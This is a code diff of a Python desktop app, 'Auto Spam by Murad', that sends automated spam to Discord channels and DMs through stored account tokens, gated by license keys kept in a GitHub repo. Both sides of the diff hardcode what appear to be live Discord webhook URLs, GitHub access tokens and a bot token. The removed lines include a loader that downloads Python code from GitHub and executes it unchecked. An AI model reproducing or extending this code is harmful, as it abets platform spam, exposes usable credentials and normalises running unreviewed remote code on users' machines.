@@ -18,8 +18,6 @@ import wmi
 import certifi
 from PIL import Image, ImageTk  
 from io import BytesIO
-import importlib.util
-import tempfile
 
 def setup_cert():
     cert_path = os.path.join(os.path.dirname(__file__), "cacert.pem")
@@ -34,38 +32,32 @@ logging.basicConfig(
 
 logging.basicConfig(level=logging.DEBUG)
 
-REGISTERED_WEBHOOK_URL = "https://discord.com/api/webhooks/1339789514939301929/bw3X6IFlPrTIAr8THkPTZFFFjrB0GDNY4XuYaXCmYxG0Hjv3mJrwiaPr_gil6VXVcrYS"
-UNREGISTERED_WEBHOOK_URL = "https://discord.com/api/webhooks/1339789719743234142/cihd4V7J6jvzU7SQioQdNZ2Gkrff4fbLsWAgi-9XsktyVq9XzA98Sg3YAWl6QI8ZNXeh"
-GITHUB_API_URL = "https://api.github.com/repos/MuradNi/TrialPost"
-GITHUB_TOKEN = "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"
-BOT_TOKEN = "MTI3NjAyMzE2NTQwMjg3MzkzOA.GnQbIU.D9-TeSHbL6-3izBCGeUOv5tRYgK9GUrGwrOUyU"  # Replace with your Discord bot token
-SERVER_ID = "1203354176139305061" 
+REGISTERED_WEBHOOK_URL = "https://discord.com/api/webhooks/1264239620409786472/lZCfJXb4ySeqrW4Nr0z1kqcdHZGV8VEvqBx0xda2G_A1b5p6iW56eoPIPkRT5qanVm8p"
+UNREGISTERED_WEBHOOK_URL = "https://discord.com/api/webhooks/1266059205824086036/sK4_8FGJR-ZNToMwV2KQsAb1bCTkO32fMXSF4CLTyL9W1pwZO2D27vOJoeHS23TI66es"
+GITHUB_API_URL = "https://api.github.com/repos/MuradNi/wdawdawda"
+GITHUB_TOKEN = "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"
 
 def log_and_print(message):
     print(message)
     logging.info(message)
 
 def send_uuid_status_webhook(url, content, is_registered=True, user_id=None):
-    """Send webhook with rate limiting and duplicate prevention"""
+    log_and_print(f"Sending webhook to {url}")
     try:
-        # Rate limiting check
-        current_time = time.time()
-        if hasattr(send_uuid_status_webhook, 'last_sent'):
-            if (current_time - send_uuid_status_webhook.last_sent) < 5:
-                return  # Skip if less than 5 seconds since last webhook
+        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        color = 0x00FF00 if is_registered else 0xFF0000
+        title = "Registered User Login" if is_registered else "Unregistered User Attempt"
         
-        send_uuid_status_webhook.last_sent = current_time
-        
-        # Create webhook payload
-        timestamp = datetime.now(timezone.utc).isoformat()
-        formatted_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
+        description = f"<@{user_id}>" if is_registered and user_id else content
+
+        banner_url = "https://i.ibb.co.com/f1ZScNq/standard-2.gif"
+
         embed = {
-            "title": "Auto Spam User Status",
-            "description": f"User <@{user_id}> has {'logged in' if is_registered else 'logged out'}" if user_id else content,
-            "color": 0x00FF00 if is_registered else 0xFF0000,
-            "timestamp": timestamp,
-            "image": {"url": "https://i.ibb.co.com/f1ZScNq/standard-2.gif"},
+            "title": title,
+            "description": description,
+            "color": color,
+            "timestamp": datetime.now(timezone.utc).isoformat(),
+            "image": {"url": banner_url},
             "footer": {
                 "text": "Auto Message Log",
                 "icon_url": "https://i.ibb.co/FwddMLs/image.png"
@@ -74,23 +66,21 @@ def send_uuid_status_webhook(url, content, is_registered=True, user_id=None):
                 "url": "https://i.ibb.co/FwddMLs/image.png"
             },
             "fields": [
-                {"name": "Time", "value": formatted_time, "inline": True},
-                {"name": "Status", "value": "Active Session" if is_registered else "Session Ended", "inline": True}
+                {"name": "Time", "value": current_time, "inline": True},
+                {"name": "Status", "value": "Access Granted" if is_registered else "Access Denied", "inline": True}
             ]
         }
-        
         payload = {
             "embeds": [embed],
             "username": "SECURITY AUTO POSTED",
             "avatar_url": "https://ibb.co.com/Y8JHcjh"
         }
-        
-        # Send webhook with timeout
-        response = requests.post(url, json=payload, timeout=5)
+        response = requests.post(url, json=payload, timeout=10)
         response.raise_for_status()
-        
+        log_and_print(f"UUID status webhook sent successfully to {url}")
     except Exception as e:
-        logging.error(f"Error sending webhook: {str(e)}")
+        log_and_print(f"Error sending UUID status webhook: {str(e)}")
+    pass
 
 def generate_device_id():
     c = wmi.WMI()
@@ -101,42 +91,33 @@ def generate_device_id():
 def get_valid_keys():
     try:
         headers = {"Authorization": f"token {GITHUB_TOKEN}"}
-        url = f"{GITHUB_API_URL}/contents/Keys.Tann18.json"
+        url = f"{GITHUB_API_URL}/contents/keys.json"
         response = requests.get(url, headers=headers)
         response.raise_for_status()
         content = base64.b64decode(response.json()["content"]).decode('utf-8')
         return json.loads(content)
+    except requests.exceptions.HTTPError as e:
+        logging.error(f"HTTP error saat mengambil keys dari GitHub: {e}")
+    except json.JSONDecodeError as e:
+        logging.error(f"Error saat mendecode JSON dari GitHub: {e}")
     except Exception as e:
-        logging.error(f"Error getting keys from GitHub: {str(e)}")
-        return {"keys": {}}
+        logging.error(f"Error tidak terduga saat mengambil keys dari GitHub: {e}")
+    return {"keys": {}}
 
 def check_key():
     try:
         device_id = generate_device_id()
         valid_keys = get_valid_keys()
         
-        # Check if this device already has an active key
         for key, info in valid_keys['keys'].items():
             if info.get('device_id') == device_id and info['status'] == 'used':
-                # Device already has an active key
-                is_member, message = check_discord_membership(
-                    info['discord_id'], 
-                    SERVER_ID,
-                    BOT_TOKEN
-                )
-                if is_member:
-                    send_uuid_status_webhook(
-                        REGISTERED_WEBHOOK_URL, 
-                        "Login successful", 
-                        is_registered=True, 
-                        user_id=info['discord_id']
-                    )
-                    return True, "Key valid untuk perangkat ini."
-                
-        return False, "Tidak ada key yang aktif untuk perangkat ini."
+                send_uuid_status_webhook(REGISTERED_WEBHOOK_URL, "", is_registered=True, user_id=info['discord_id'])
+                return True, "Key valid untuk perangkat ini."
         
+        send_uuid_status_webhook(UNREGISTERED_WEBHOOK_URL, "No valid key", is_registered=False)
+        return False, "Tidak ada key yang aktif untuk perangkat ini atau key sudah tidak valid."
     except Exception as e:
-        logging.error(f"Error checking key: {str(e)}")
+        log_and_print(f"Error checking key: {str(e)}")
         return False, f"Terjadi kesalahan saat memeriksa key: {str(e)}"
 
 def update_github_keys(updated_keys):
@@ -146,7 +127,8 @@ def update_github_keys(updated_keys):
             "Accept": "application/vnd.github.v3+json"
         }
         
-        current_file = requests.get(f"{GITHUB_API_URL}/contents/Keys.Tann18.json", headers=headers)
+        # Dapatkan informasi file saat ini
+        current_file = requests.get(f"{GITHUB_API_URL}/contents/keys.json", headers=headers)
         current_file.raise_for_status()
         current_sha = current_file.json()['sha']
 
@@ -162,7 +144,7 @@ def update_github_keys(updated_keys):
             "sha": current_sha
         }
         
-        response = requests.put(f"{GITHUB_API_URL}/contents/Keys.Tann18.json", headers=headers, json=data)
+        response = requests.put(f"{GITHUB_API_URL}/contents/keys.json", headers=headers, json=data)
         response.raise_for_status()
         log_and_print("Keys updated successfully in GitHub")
         return True
@@ -172,328 +154,87 @@ def update_github_keys(updated_keys):
             log_and_print(f"Response content: {e.response.content}")
         return False
 
-def check_discord_membership(discord_id, guild_id, bot_token):
-    try:
-        headers = {
-            'Authorization': f'Bot {bot_token}',
-            'Content-Type': 'application/json'
-        }
-        
-        # Check guild membership directly
-        response = requests.get(
-            f'https://discord.com/api/v9/guilds/{guild_id}/members/{discord_id}',
-            headers=headers
-        )
-        
-        if response.status_code == 200:
-            return True, "User terdaftar di server."
-        else:
-            return False, "User tidak terdaftar di server Discord."
-            
-    except Exception as e:
-        logging.error(f"Error checking Discord membership: {str(e)}")
-        return False, f"Error memeriksa keanggotaan Discord: {str(e)}"
-
 def activate_key(entered_key):
-    try:
-        valid_keys = get_valid_keys()
-        
-        if entered_key not in valid_keys['keys']:
-            return False, "Key tidak valid.", None
-            
-        key_info = valid_keys['keys'][entered_key]
-        
-        if key_info['status'] != 'active':
-            return False, "Key sudah digunakan.", None
-            
-        device_id = generate_device_id()
-        
-        # Check if device already has another key
-        for key, info in valid_keys['keys'].items():
-            if info.get('device_id') == device_id and info['status'] == 'used':
-                return False, "Perangkat ini sudah memiliki key yang aktif.", None
-        
-        discord_id = simpledialog.askstring("Discord ID", "Masukkan User ID Discord Anda:")
-        if not discord_id:
-            return False, "User ID Discord diperlukan.", None
-            
-        is_member, message = check_discord_membership(discord_id, SERVER_ID, BOT_TOKEN)
-        if not is_member:
-            return False, message, None
-        
-        valid_keys['keys'][entered_key].update({
-            'status': 'used',
-            'discord_id': discord_id,
-            'device_id': device_id
-        })
-        
-        if update_github_keys(valid_keys):
-            send_uuid_status_webhook(
-                REGISTERED_WEBHOOK_URL, 
-                "Key activation successful", 
-                is_registered=True, 
-                user_id=discord_id
-            )
-            return True, "Key berhasil diaktifkan.", entered_key
-        else:
-            return False, "Gagal mengupdate status key. Coba lagi.", None
-            
-    except Exception as e:
-        logging.error(f"Error activating key: {str(e)}")
-        return False, f"Error saat aktivasi key: {str(e)}", None
-
-def deactivate_key(root):
-    try:
-        if messagebox.askyesno("Konfirmasi", "Apakah Anda yakin ingin logout?"):
+    valid_keys = get_valid_keys()
+    if entered_key in valid_keys['keys']:
+        if valid_keys['keys'][entered_key]['status'] == 'active':
             device_id = generate_device_id()
-            valid_keys = get_valid_keys()
             
-            found_key = None
-            discord_id = None
-            for key, info in valid_keys['keys'].items():
-                if info.get('device_id') == device_id:
-                    found_key = key
-                    discord_id = info.get('discord_id')
-                    break
-                    
-            if found_key:
-                valid_keys['keys'][found_key].update({
-                    'status': 'active',
-                    'device_id': None,
-                    'discord_id': None
-                })
-                
-                if update_github_keys(valid_keys):
-                    # Show closing dialog
-                    closing_dialog = ClosingDialog(root)
-                    root.wait_window(closing_dialog.dialog)
-                    
-                    # Send webhook
-                    send_uuid_status_webhook(
-                        REGISTERED_WEBHOOK_URL,
-                        "Session ended",
-                        is_registered=False,
-                        user_id=discord_id
-                    )
-                    
-                    # Destroy root window
-                    root.destroy()
-                    return True, "Successfully logged out."
-            return False, "No active key found for this device."
-    except Exception as e:
-        logging.error(f"Error during logout: {str(e)}")
-        return False, f"Error during logout: {str(e)}"
-
-class ClosingDialog:
-    def __init__(self, parent):
-        self.dialog = tk.Toplevel(parent)
-        self.dialog.title("Closing Application")
-        self.dialog.geometry("400x300")
-        self.dialog.transient(parent)
-        self.dialog.grab_set()
-        self.dialog.configure(bg="#2b2b2b")
-        
-        # Style configuration
-        style = ttk.Style()
-        style.configure("Custom.TFrame", background="#2b2b2b")
-        style.configure("Custom.TLabel", background="#2b2b2b", foreground="white", font=("Helvetica", 12))
-        style.configure("RedAccent.TButton", background="#ff4444", foreground="white")
-        
-        # Main frame
-        self.frame = ttk.Frame(self.dialog, style="Custom.TFrame", padding="20")
-        self.frame.pack(fill=tk.BOTH, expand=True)
-        
-        # Title
-        title_label = ttk.Label(
-            self.frame, 
-            text="Thank You for Using Auto Spam",
-            font=("Helvetica", 14, "bold"),
-            style="Custom.TLabel"
-        )
-        title_label.pack(pady=(0, 20))
-        
-        # Message
-        msg_label = ttk.Label(
-            self.frame,
-            text="Your session has been ended successfully.\nThank you for using our application!",
-            justify=tk.CENTER,
-            style="Custom.TLabel"
-        )
-        msg_label.pack(pady=(0, 30))
-        
-        # Progress bar with faster updates
-        self.progress = ttk.Progressbar(self.frame, mode="determinate", length=300)
-        self.progress.pack(pady=(0, 20))
-        
-        # Start progress with faster increments
-        self.progress_value = 0
-        self.update_progress()
-        
-        # Center the dialog
-        self.center_dialog()
+            discord_id = simpledialog.askstring("Discord ID", "Masukkan User ID Discord Anda:")
+            if not discord_id:
+                return False, "User ID Discord diperlukan.", None
+            
+            if valid_keys['keys'][entered_key].get('device_id'):
+                return False, "Key ini sudah digunakan pada perangkat lain.", None
+            
+            valid_keys['keys'][entered_key]['status'] = 'used'
+            valid_keys['keys'][entered_key]['discord_id'] = discord_id
+            valid_keys['keys'][entered_key]['device_id'] = device_id
+            
+            if update_github_keys(valid_keys):
+                send_uuid_status_webhook(REGISTERED_WEBHOOK_URL, "", is_registered=True, user_id=discord_id)
+                return True, "Key berhasil diaktifkan.", entered_key
+            else:
+                return False, "Gagal mengupdate status key. Coba lagi.", None
+        else:
+            return False, "Key sudah digunakan.", None
+    else:
+        return False, "Key tidak valid.", None
     
-    def center_dialog(self):
-        self.dialog.update_idletasks()
-        width = self.dialog.winfo_width()
-        height = self.dialog.winfo_height()
-        x = (self.dialog.winfo_screenwidth() // 2) - (width // 2)
-        y = (self.dialog.winfo_screenheight() // 2) - (height // 2)
-        self.dialog.geometry(f'+{x}+{y}')
-    
-    def update_progress(self):
-        if self.progress_value < 100:
-            self.progress_value += 5  # Faster increment
-            self.progress["value"] = self.progress_value
-            self.dialog.after(10, self.update_progress)  # Update more frequently
-    
-    def close(self):
-        self.dialog.destroy()
-
-class KeyActivationDialog:
-    def __init__(self, parent):
-        self.dialog = tk.Toplevel(parent)
-        self.dialog.title("Aktivasi Key")
-        self.dialog.geometry("300x150")
-        self.dialog.transient(parent)
-        self.dialog.grab_set()
-        
-        self.result = None
-        
-        ttk.Label(self.dialog, text="Masukkan Key:").pack(pady=10)
-        self.key_entry = ttk.Entry(self.dialog)
-        self.key_entry.pack(pady=5)
-        
-        ttk.Button(self.dialog, text="Aktivasi", command=self.activate).pack(pady=10)
-        
-        # Center the dialog
-        self.dialog.update_idletasks()
-        width = self.dialog.winfo_width()
-        height = self.dialog.winfo_height()
-        x = (self.dialog.winfo_screenwidth() // 2) - (width // 2)
-        y = (self.dialog.winfo_screenheight() // 2) - (height // 2)
-        self.dialog.geometry(f'+{x}+{y}')
-    
-    def activate(self):
-        key = self.key_entry.get().strip()
-        if key:
-            self.result = key
-            self.dialog.destroy()
-
-class Loader:
-    def __init__(self):
-        self.window = tk.Tk()
-        self.window.title("Auto Spam Loader")
-        self.window.geometry("400x200")
-        
-        self.label = tk.Label(self.window, text="Memuat aplikasi dari GitHub...")
-        self.label.pack(pady=20)
-        
-        self.progress = tk.Label(self.window, text="Memeriksa pembaruan...")
-        self.progress.pack(pady=10)
-        
-        # Mulai proses loading
-        self.window.after(1000, self.load_from_github)
-        
-        self.window.mainloop()
-    
-    def load_from_github(self):
-        try:
-            self.progress.config(text="Mengunduh kode terbaru...")
-            
-            # URL ke file Python raw di GitHub (ganti dengan URL Anda)
-            github_url = "https://raw.githubusercontent.com/MuradNi/adwdawdawdaw/refs/heads/main/tes.py"
-            
-            # Unduh kode
-            response = requests.get(github_url)
-            if response.status_code != 200:
-                raise Exception(f"Gagal mengunduh: {response.status_code}")
-            
-            code = response.text
-            
-            # Simpan ke file temporary
-            with tempfile.NamedTemporaryFile(suffix=".py", delete=False) as temp_file:
-                temp_path = temp_file.name
-                temp_file.write(code.encode())
-            
-            self.progress.config(text="Menjalankan aplikasi...")
-            
-            # Import dan jalankan
-            spec = importlib.util.spec_from_file_location("autospam_module", temp_path)
-            module = importlib.util.module_from_spec(spec)
-            sys.modules["autospam_module"] = module
-            spec.loader.exec_module(module)
-            
-            # Tutup window loader
-            self.window.destroy()
-            
-            # Jalankan aplikasi utama
-            if hasattr(module, 'main'):
-                module.main()
-            elif hasattr(module, 'AutoSpamGUI'):
-                # Buat window baru untuk aplikasi utama
-                root = tk.Tk()
-                app = module.AutoSpamGUI(root)
-                root.mainloop()
-            
-        except Exception as e:
-            self.progress.config(text=f"Error: {str(e)}")
-
 class AutoSpamGUI:
     def __init__(self, master):
         self.master = master
         master.title("Auto Spam by Murad")
         master.geometry("900x600")
-        
-        self.key_validated = False  # Reset key validation flag
-        
+
         self.main_frame = ttk.Frame(master)
         self.main_frame.pack(fill=tk.BOTH, expand=True)
-    
+
         self.canvas = tk.Canvas(self.main_frame)
         self.canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
-    
+
         self.scrollbar = ttk.Scrollbar(self.main_frame, orient=tk.VERTICAL, command=self.canvas.yview)
         self.scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
-    
+
         self.canvas.configure(yscrollcommand=self.scrollbar.set)
         self.canvas.bind('<Configure>', lambda e: self.canvas.configure(scrollregion=self.canvas.bbox("all")))
-    
+
         self.scrollable_frame = ttk.Frame(self.canvas)
         self.canvas.create_window((0, 0), window=self.scrollable_frame, anchor="nw")
-    
+
         self.scrollable_frame.bind("<Enter>", self._bound_to_mousewheel)
         self.scrollable_frame.bind("<Leave>", self._unbound_to_mousewheel)
-    
+
         self.style = ttk.Style(master)
         self.style.theme_use("clam")
-    
+
         self.stop_event = threading.Event()
         self.spam_threads = []
-    
+
         self.config_file = self.get_config_path()
         self.load_config()
-    
+
         self.cert_path = self.setup_cert()
         self.tokens = []  # Initialize tokens list
-    
+
         self.selected_token = tk.StringVar()
         self.is_dm = tk.BooleanVar(value=False)
         
         self.is_running = False
         self.start_time = datetime.now()
-    
+
         self.message_count = 0
-    
+
         self.channel_threads = {}
-    
+
         self.channel_status = {}
         self.channel_status_lock = threading.Lock()
-    
+
         self.status_tree = None
-    
+
         self.notebook = ttk.Notebook(self.scrollable_frame)
         self.notebook.pack(fill=tk.BOTH, expand=True)
-    
+
         self.current_theme = "light"
         self.set_theme("#f0f0f0", "#333333", "#4CAF50", "white")
     
@@ -501,160 +242,6 @@ class AutoSpamGUI:
         self.create_status_widgets()
         self.load_tokens()  # Load tokens after widgets are created
         self.load_initial_configurations()
-        self.status_update_job = None
-        self.check_registration_status()
-    
-        # Check if already logged in
-        is_registered, message = check_key()
-        if not is_registered:
-            self.show_key_activation()
-            if not hasattr(self, 'key_validated') or not self.key_validated:
-                master.destroy()  # Close if no valid key
-                return
-
-    def show_logout_button(self):
-        if not hasattr(self, 'logout_button'):
-            self.logout_button = ttk.Button(
-                self.scrollable_frame,
-                text="Logout",
-                command=self.handle_logout,
-                style="Accent.TButton"
-            )
-            self.logout_button.pack(pady=10)
-
-    def hide_logout_button(self):
-        if hasattr(self, 'logout_button'):
-            self.logout_button.pack_forget()
-
-    def handle_logout(self):
-        if messagebox.askyesno("Confirm Logout", "Are you sure you want to logout?"):
-            success, message = self.deactivate_and_restart()
-            if not success:
-                messagebox.showerror("Error", message)
-
-    def deactivate_and_restart(self):
-        """Handle logout and restart process"""
-        try:
-            device_id = generate_device_id()
-            valid_keys = get_valid_keys()
-
-            # Find current key
-            found_key = None
-            discord_id = None
-            for key, info in valid_keys['keys'].items():
-                if info.get('device_id') == device_id:
-                    found_key = key
-                    discord_id = info.get('discord_id')
-                    break
-
-            if not found_key:
-                return False, "No active key found for this device."
-
-            # Update key status
-            valid_keys['keys'][found_key].update({
-                'status': 'active',
-                'device_id': None,
-                'discord_id': None
-            })
-
-            if not update_github_keys(valid_keys):
-                return False, "Failed to update key status."
-
-            # Send webhook before showing dialog
-            send_uuid_status_webhook(
-                REGISTERED_WEBHOOK_URL,
-                "Session ended",
-                is_registered=False,
-                user_id=discord_id
-            )
-
-            # Clean up threads and stop ongoing processes
-            self.stop_spam_with_status()
-
-            # Show closing dialog
-            closing_dialog = ClosingDialog(self.master)
-            self.master.after(1500, closing_dialog.dialog.destroy)  # Auto-close after 1.5 seconds
-            self.master.wait_window(closing_dialog.dialog)
-
-            # Destroy main window and restart application
-            self.clean_up_widgets()
-            self.master.withdraw()
-
-            # Restart the application flow (similar to main())
-            loading_window = show_loading_window(self.master)
-
-            def after_restart():
-                if loading_window:
-                    loading_window.destroy()
-                if not check_and_activate_key(self.master):
-                    self.master.destroy()
-                    return
-
-                start_main_application(self.master)
-
-            self.master.after(1000, after_restart)
-            return True, "Successfully logged out."
-
-        except Exception as e:
-            logging.error(f"Error during logout and restart: {str(e)}")
-            return False, f"Error during logout: {str(e)}"
-
-    def restart_key_activation(self):
-        while True:
-            key = simpledialog.askstring("Aktivasi", "Masukkan key untuk aktivasi:")
-            if key:
-                is_activated, activation_message, activated_key = activate_key(key)
-                if is_activated:
-                    messagebox.showinfo("Info", activation_message + "\nAplikasi berjalan...")
-                    # Reinitialize the application with the new key
-                    self.master.deiconify()  # Show main window again
-                    start_main_application(self.master)
-                    break
-                else:
-                    retry = messagebox.askretrycancel("Error", activation_message + "\nCoba lagi?")
-                    if not retry:
-                        self.master.destroy()
-                        break
-            else:
-                self.master.destroy()
-                break
-    
-    def show_key_activation(self):
-        dialog = KeyActivationDialog(self.master)
-        self.master.wait_window(dialog.dialog)
-        
-        if dialog.result:
-            success, message, key = activate_key(dialog.result)
-            if success:
-                messagebox.showinfo("Success", message)
-                self.key_validated = True
-                self.check_registration_status()
-            else:
-                messagebox.showerror("Error", message)
-                self.key_validated = False
-                self.show_key_activation()
-    
-    def check_registration_status(self):
-        is_registered, message = check_key()
-        if is_registered:
-            self.show_logout_button()
-            self.enable_app_features()
-        else:
-            self.hide_logout_button()
-            self.disable_app_features()
-            self.show_key_activation()
-    
-    def enable_app_features(self):
-        # Enable all app features/widgets
-        for child in self.scrollable_frame.winfo_children():
-            if isinstance(child, (ttk.Entry, ttk.Button, tk.Text)):
-                child.configure(state='normal')
-    
-    def disable_app_features(self):
-        # Disable all app features/widgets except logout button
-        for child in self.scrollable_frame.winfo_children():
-            if isinstance(child, (ttk.Entry, ttk.Button, tk.Text)) and child != self.logout_button:
-                child.configure(state='disabled')
 
     def set_theme(self, bg_color, fg_color, button_bg, button_fg):
         self.style.configure("TFrame", background=bg_color)
@@ -721,84 +308,6 @@ class AutoSpamGUI:
         with open(self.config_file, 'w') as f:
             json.dump(self.config, f, indent=4)
         self.update_channel_status()
-
-    def clean_up_widgets(self):
-        """Safely clean up all widgets and bindings"""
-        try:
-            # Remove all bindings
-            if hasattr(self, 'scrollable_frame'):
-                self.scrollable_frame.unbind("<Enter>")
-                self.scrollable_frame.unbind("<Leave>")
-                self.scrollable_frame.unbind_all("<MouseWheel>")
-                self.scrollable_frame.unbind_all("<Button-4>")
-                self.scrollable_frame.unbind_all("<Button-5>")
-
-            # Cancel all scheduled tasks
-            if hasattr(self, 'status_update_job'):
-                self.master.after_cancel(self.status_update_job)
-                self.status_update_job = None
-
-            # Destroy all widgets in reverse order
-            if hasattr(self, 'scrollable_frame'):
-                for widget in self.scrollable_frame.winfo_children():
-                    widget.destroy()
-
-            if hasattr(self, 'canvas'):
-                self.canvas.delete('all')
-                self.canvas.destroy()
-
-            if hasattr(self, 'scrollbar'):
-                self.scrollbar.destroy()
-
-            if hasattr(self, 'main_frame'):
-                self.main_frame.destroy()
-
-        except Exception as e:
-            logging.error(f"Error cleaning up widgets: {str(e)}")
-
-    def reinitialize_gui(self):
-        """Reinitialize the GUI after cleanup"""
-        try:
-            # Create new main frame
-            self.main_frame = ttk.Frame(self.master)
-            self.main_frame.pack(fill=tk.BOTH, expand=True)
-
-            # Create new canvas
-            self.canvas = tk.Canvas(self.main_frame)
-            self.canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
-
-            # Create new scrollbar
-            self.scrollbar = ttk.Scrollbar(self.main_frame, orient=tk.VERTICAL, command=self.canvas.yview)
-            self.scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
-
-            self.canvas.configure(yscrollcommand=self.scrollbar.set)
-            self.canvas.bind('<Configure>', lambda e: self.canvas.configure(scrollregion=self.canvas.bbox("all")))
-
-            # Create new scrollable frame
-            self.scrollable_frame = ttk.Frame(self.canvas)
-            self.canvas.create_window((0, 0), window=self.scrollable_frame, anchor="nw")
-
-            # Rebind mouse wheel
-            self.scrollable_frame.bind("<Enter>", self._bound_to_mousewheel)
-            self.scrollable_frame.bind("<Leave>", self._unbound_to_mousewheel)
-
-            # Recreate notebook
-            self.notebook = ttk.Notebook(self.scrollable_frame)
-            self.notebook.pack(fill=tk.BOTH, expand=True)
-
-            # Reset any necessary instance variables
-            self.channel_status = {}
-            self.status_update_job = None
-
-            # Create widgets
-            self.create_widgets()
-            self.create_status_widgets()
-            self.load_tokens()
-            self.load_initial_configurations()
-
-        except Exception as e:
-            logging.error(f"Error reinitializing GUI: {str(e)}")
-            messagebox.showerror("Error", "Failed to reinitialize application. Please restart.")
 
     def create_widgets(self):
     # Configuration Tab
@@ -902,14 +411,6 @@ class AutoSpamGUI:
         ttk.Button(webhook_frame, text="Test Webhook", command=self.test_webhook_connection).grid(row=2, column=1, sticky="w", pady=10)
         ttk.Button(webhook_frame, text="Save Settings", command=self.save_settings).grid(row=3, column=1, sticky="w", pady=10)
 
-        self.style.configure(
-        "Accent.TButton",
-        background="#ff4444",
-        foreground="white",
-        padding=5
-        )
-        pass
-
     def create_status_widgets(self):
         status_frame = ttk.Frame(self.notebook)
         self.notebook.add(status_frame, text="Status")
@@ -974,20 +475,12 @@ class AutoSpamGUI:
         item = self.status_tree.identify('item', event.x, event.y)
         column = self.status_tree.identify('column', event.x, event.y)
         if column == '#7':  # Action column
-            # Get full details from the selected row
             channel_id = self.status_tree.item(item, "text")
-            values = self.status_tree.item(item, "values")
-            token_name = values[1]  # Token name is in the second column
-            current_status = values[2]  # Status is in the third column
-
-            # Create a unique status key
-            status_key = f"{channel_id}_{token_name}"
-
+            current_status = self.status_tree.item(item, "values")[1]
             if current_status == "Running":
-                self.stop_single_spam(status_key)
+                self.stop_single_spam(channel_id)
             else:
-                # Find the specific channel configuration matching both channel_id and token_name
-                channel_config = self.get_specific_channel_config(channel_id, token_name)
+                channel_config = self.get_channel_config(channel_id)
                 if channel_config:
                     self.start_single_spam(channel_config)
 
@@ -997,31 +490,13 @@ class AutoSpamGUI:
             column = self.status_tree.identify_column(event.x)
             if column == "#7":  # Action column
                 item = self.status_tree.identify_row(event.y)
-                if not item:
-                    return
-
-                values = self.status_tree.item(item)['values']
-                if not values:
-                    return
-
-                channel_id = self.status_tree.item(item)['text']
-                token_name = values[1]  # Get token name from the second column
-
-                # Create status key consistent with the rest of the application
-                status_key = f"{channel_id}_{token_name}"
-
-                current_status = None
-                with self.channel_status_lock:
-                    # Use the status_key format in channel_status
-                    status_key = f"{channel_id}_{token_name}"
-                    if status_key in self.channel_status:
-                        current_status = self.channel_status[status_key]['status']
-
+                channel_id = self.status_tree.item(item, "text")
+                current_status = self.status_tree.item(item, "values")[1]
                 if current_status == "Running":
                     if messagebox.askyesno("Confirm Stop", f"Are you sure you want to stop the spam for channel {channel_id}?"):
-                        self.stop_single_spam(status_key)
+                        self.stop_single_spam(channel_id)
                 else:
-                    channel_config = self.get_specific_channel_config(channel_id, token_name)
+                    channel_config = self.get_channel_config(channel_id)
                     if channel_config:
                         self.start_single_spam(channel_config)
 
@@ -1044,105 +519,60 @@ class AutoSpamGUI:
 
     def update_status_display(self):
         """Update the status tree with all configurations and their current status"""
-        try:
-            if not hasattr(self, 'status_tree') or not self.status_tree.winfo_exists():
-                return
-
-            # Clear existing items safely
-            try:
-                for item in self.status_tree.get_children():
-                    self.status_tree.delete(item)
-            except tk.TclError:
-                return  # Widget was destroyed, exit early
-
-            total_messages = 0
-            current_time = time.time()
-
-            with self.channel_status_lock:
-                # Group configurations by channel_id
-                channel_configs = {}
-                for channel in self.config.get("channels", []):
-                    channel_id = channel["channel_id"]
-                    if channel_id not in channel_configs:
-                        channel_configs[channel_id] = []
-                    channel_configs[channel_id].append(channel)
-
-                # Process each channel and its configurations
-                for channel_id, configs in channel_configs.items():
-                    token_statuses = {}
-                    for config in configs:
-                        token_name = config.get("token_name", "")
-                        if not token_name:
-                            continue
-                        
-                        # Create unique status key
-                        status_key = f"{channel_id}_{token_name}"
-
-                        # Get or create status info with safe defaults
-                        status_info = self.channel_status.get(status_key, {
-                            'status': 'Stopped',
-                            'message_count': 0,
-                            'start_time': None,
-                            'last_message_time': None
-                        })
-
-                        token_statuses[token_name] = status_info
-                        total_messages += status_info.get('message_count', 0)
-
-                    # Add each configuration to the status tree
-                    for token_name, status_info in token_statuses.items():
-                        try:
-                            # Calculate running time
-                            running_time = "--"
-                            if status_info.get('start_time'):
-                                if status_info['status'] == 'Running':
-                                    running_time = self.format_time_difference(current_time - status_info['start_time'])
-                                elif status_info.get('stop_time'):
-                                    running_time = self.format_time_difference(status_info['stop_time'] - status_info['start_time'])
-
-                            # Calculate last message time
-                            last_message = "--"
-                            if status_info.get('last_message_time'):
-                                last_message_diff = current_time - status_info['last_message_time']
-                                if last_message_diff < 60:
-                                    last_message = f"{int(last_message_diff)} sec ago"
-                                elif last_message_diff < 3600:
-                                    last_message = f"{int(last_message_diff/60)} min ago"
-                                else:
-                                    last_message = f"{int(last_message_diff/3600)} hr ago"
-
-                            # Find the specific configuration
-                            config = next((c for c in configs if c.get("token_name") == token_name), None)
-                            if config:
-                                channel_name = config.get("channel_name", "")
-                                display_name = f"{channel_name} - " if channel_name else ""
-
-                                self.status_tree.insert("", "end", text=channel_id, values=(
-                                    display_name + channel_id,
-                                    token_name,
-                                    status_info['status'],
-                                    running_time,
-                                    str(status_info.get('message_count', 0)),
-                                    last_message,
-                                    "Stop" if status_info['status'] == 'Running' else "Start"
-                                ))
-                        except tk.TclError:
-                            return  # Exit if widget was destroyed during update
-
-                # Update total messages label safely
-                if hasattr(self, 'total_messages_label') and self.total_messages_label.winfo_exists():
-                    self.total_messages_label.config(text=f"Total Messages Sent: {total_messages}")
-
-            # Schedule next update with error handling
-            if hasattr(self, 'status_update_job'):
-                self.master.after_cancel(self.status_update_job)
-            self.status_update_job = self.master.after(1000, self.update_status_display)
-
-        except Exception as e:
-            logging.error(f"Error in update_status_display: {str(e)}")
-            # Try to reschedule even if there was an error
-            if hasattr(self, 'master') and self.master.winfo_exists():
-                self.master.after(1000, self.update_status_display)
+        if not hasattr(self, 'status_tree'):
+            return
+    
+        # Clear existing items
+        for item in self.status_tree.get_children():
+            self.status_tree.delete(item)
+    
+        # Get all unique channel IDs from configs
+        channel_configs = {}
+        for channel in self.config["channels"]:
+            channel_id = channel["channel_id"]
+            if channel_id not in channel_configs:
+                channel_configs[channel_id] = []
+            channel_configs[channel_id].append(channel)
+    
+        # Update status tree with all configurations
+        with self.channel_status_lock:
